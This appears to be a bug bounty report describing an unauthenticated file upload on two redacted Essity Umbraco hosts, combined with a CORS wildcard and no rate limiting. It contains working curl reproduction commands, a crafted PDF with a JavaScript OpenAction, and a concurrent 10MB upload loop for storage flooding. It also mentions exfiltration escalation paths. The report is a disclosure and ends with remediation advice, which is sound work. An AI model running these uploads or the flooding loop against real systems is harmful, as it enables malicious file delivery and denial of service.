title: Unauthenticated File Upload with CORS Wildcard and No Rate Limiting on ████████ and ████████
vulnerability_information:
## Summary The `POST /Umbraco/Api/ContactApi/SaveAttachment` endpoint on both `████████` and `████████` allows unauthenticated file uploads without CAPTCHA, without rate limiting, and with a CORS `access-control-allow-origin: *` header. This combination allows any website on the internet to silently upload malicious files (including PDFs with embedded JavaScript) to Essity's backend storage. ## Affected Assets - `https://████████/Umbraco/Api/ContactApi/SaveAttachment` - `https://████████/Umbraco/Api/ContactApi/SaveAttachment` ## Steps To Reproduce ### 1. Basic unauthenticated file upload (PNG) ```bash # Create a minimal valid PNG printf '\x89PNG\r\n\x1a\n' > /tmp/test.png # Upload without any authentication curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \ -H 'X-Requested-With: XMLHttpRequest' \ -F 'file=@/tmp/test.png;type=image/png;filename=test.png' ``` **Expected:** Error or authentication required **Actual:** `["2e1ab0fe-db41-45ee-ad63-954edf814f77_test.png"]` (file stored successfully) ### 2. Malicious PDF with JavaScript OpenAction ```bash # Create a PDF that executes JavaScript when opened cat > /tmp/malicious.pdf << 'EOF' %PDF-1.4 1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj 2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj 3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj 4 0 obj << /Type /Action /S /JavaScript /JS (app.alert('matty69v XSS PoC - document.domain')) >> endobj xref 0 5 0000000000 65535 f 0000000009 00000 n 0000000074 00000 n 0000000120 00000 n 0000000179 00000 n trailer << /Size 5 /Root 1 0 R >> startxref 285 %%EOF EOF curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \ -H 'X-Requested-With: XMLHttpRequest' \ -F 'file=@/tmp/malicious.pdf;type=application/pdf;filename=matty69v_poc.pdf' ``` **Result:** `["af8fb7a6-1701-4574-ad20-a9429281e9f9_matty69v_poc.pdf"]` (malicious PDF stored) ### 3. CORS wildcard verification (cross-origin upload from any domain) ```bash # Preflight check from evil origin curl -sk -X OPTIONS 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \ -H 'Origin: https://evil.attacker.com' \ -H 'Access-Control-Request-Method: POST' \ -H 'Access-Control-Request-Headers: X-Requested-With' ``` **Response headers include:** ``` access-control-allow-origin: * ``` This means any website can upload files via JavaScript fetch/XMLHttpRequest. ### 4. Cross-origin PoC (browser-based exploitation) Save and open this HTML file in any browser: ```html Essity Upload CORS PoC - matty69v

Cross-Origin File Upload PoC





```

### 5. No rate limiting (Storage DoS)

```bash
# 10 concurrent 10MB uploads - all succeed
for i in $(seq 1 10); do
  dd if=/dev/urandom bs=1024 count=10240 2>/dev/null | \
  (printf '\x89PNG\r\n\x1a\n'; cat) > /tmp/big_${i}.png
  curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \
    -H 'X-Requested-With: XMLHttpRequest' \
    -F "file=@/tmp/big_${i}.png;type=image/png;filename=flood_${i}.png" &
done
wait
# All 10 uploads succeed (100MB stored in ~6 seconds)
```

### 6. Same vulnerability on ████████

```bash
curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -F 'file=@/tmp/malicious.pdf;type=application/pdf;filename=poc.pdf'
# Returns: ["e010e9fb-d06d-4cf8-afcd-af814b8b45cd_poc.pdf"]
```

## Confirmed Test Results

| Test | ████████ | ████████ |
|------|---------|-----------------|
| PNG upload (no auth) | ACCEPTED | ACCEPTED |
| PDF upload (no auth) | ACCEPTED | ACCEPTED |
| PDF with JS OpenAction | ACCEPTED | ACCEPTED |
| CORS wildcard | Confirmed | Confirmed |
| Rate limit (5 in 2s) | No limit | No limit |
| 10x concurrent 10MB | All succeed | Not tested |

## Impact

An attacker can abuse this vulnerability to:

1. **Deliver malicious PDFs to Essity staff:** When backoffice staff reviews contact form submissions and opens the attached PDF, the embedded JavaScript executes in Adobe Reader context. This can be escalated to:
   - `app.launchURL()` for phishing attacks
   - FormCalc `url.loadFile()` for local file exfiltration from the staff workstation
   - In browser-based PDF viewers: potential XSS in the backoffice origin

2. **Storage Denial of Service:** With no authentication, no rate limit, and 14MB max file size, an attacker can write ~50GB/hour to Essity's storage from a single IP. With parallelism: unlimited. Cost to attacker: zero.

3. **Cross-Origin Exploitation:** The CORS wildcard means an attacker only needs to get any Essity employee (or any internet user) to visit their page. The upload happens silently in the background, requiring zero user interaction beyond visiting an attacker-controlled page.

## Remediation

1. Require authentication (session cookie) for file uploads
2. Implement server-side reCAPTCHA validation
3. Add rate limiting (e.g., max 3 uploads per IP per minute)
4. Scan uploaded files for malicious content (PDF JS, polyglots)
5. Replace `access-control-allow-origin: *` with specific allowed origins
6. Implement file size quota per session/IP
